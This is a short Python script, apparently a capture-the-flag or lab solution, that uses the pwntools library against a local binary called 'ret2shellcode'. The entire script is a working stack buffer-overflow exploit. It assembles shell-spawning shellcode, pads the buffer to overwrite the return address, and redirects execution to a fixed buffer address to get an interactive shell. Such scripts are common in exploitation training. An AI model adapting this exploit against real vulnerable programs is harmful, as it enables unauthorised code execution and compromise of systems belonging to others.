from pwn import *

sh = process('./ret2shellcode')

shellcode = asm(shellcraft.sh())
addr = 0x804a080

pad_len = 0x6c + 4 - len(shellcode)

sh.sendline(shellcode + b'A' * (pad_len) + p32(addr))
sh.interactive()
